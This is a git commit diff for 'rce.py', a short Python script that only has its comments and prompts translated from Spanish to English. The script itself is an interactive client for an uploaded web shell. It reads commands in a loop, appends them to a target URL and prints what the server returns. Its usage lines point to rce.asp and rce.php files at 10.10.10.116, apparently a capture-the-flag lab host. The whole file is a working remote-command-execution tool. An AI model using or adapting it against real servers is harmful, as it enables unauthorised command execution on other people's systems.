83a7d776638baad025815e46654ba2cdb86123c5
push4d <50226388+push4d@users.noreply.github.com>
2019-05-03 07:04:54 +0200

    Update rce.py

--- rce.py
+++ rce.py
@@ -2,11 +2,11 @@ import requests
 import sys
 
 if len(sys.argv) == 2:
-	# En un bucle infinito hacemos rce
+	# We use our RCE in an infinite loop
 	while True:
-		# Pedimos un comando para la RCE
-		cmd = raw_input('Comando RCE: ')
+		# We ask for a command for the RCE
+		cmd = raw_input('RCE Command: ')
 		print(requests.get(url = sys.argv[1] + cmd).content)
 else:
-	# Como usar el script
-	print("Como usar:\npython rce.py http://10.10.10.116/upload/rce.asp?cmd=\npython rce.py http://10.10.10.116/upload/rce.php?cmd=")
+	# How to use the script
+	print("How to use:\npython rce.py http://10.10.10.116/upload/rce.asp?cmd=\npython rce.py http://10.10.10.116/upload/rce.php?cmd=")
